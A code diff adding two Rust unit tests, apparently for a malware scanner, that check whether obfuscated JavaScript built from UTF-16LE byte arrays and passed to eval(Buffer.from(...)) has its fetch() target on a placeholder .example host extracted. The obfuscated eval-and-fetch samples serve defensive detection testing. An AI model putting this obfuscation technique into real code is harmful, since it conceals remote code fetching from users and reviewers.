@@ -14124,6 +14124,57 @@ mod js_url_extraction_tests {
     }
 
     #[test]
+    fn js_buffer_from_utf16le_byte_array_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let payload = "fetch('https://buffer-from-utf16le-byte-array-js.example/p')";
+        let bytes = payload
+            .encode_utf16()
+            .flat_map(u16::to_le_bytes)
+            .map(|byte| byte.to_string())
+            .collect::<Vec<_>>()
+            .join(",");
+        let js = format!(r#"eval(Buffer.from([{bytes}]).toString("utf16le"))"#).into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://buffer-from-utf16le-byte-array-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS Buffer.from UTF-16LE byte array payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_buffer_from_bound_utf16le_byte_array_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let payload = "fetch('https://buffer-from-bound-utf16le-byte-array-js.example/p')";
+        let bytes = payload
+            .encode_utf16()
+            .flat_map(u16::to_le_bytes)
+            .map(|byte| byte.to_string())
+            .collect::<Vec<_>>()
+            .join(",");
+        let js =
+            format!(r#"var a = [{bytes}]; eval(Buffer.from(a).toString("utf16le"))"#).into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://buffer-from-bound-utf16le-byte-array-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS Buffer.from bound UTF-16LE byte array payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn js_buffer_from_uint8array_payload_url_extracted() {
         let mut env = Environment::new(&Config::default());
         let payload = "fetch('https://buffer-from-uint8array-js.example/p')";
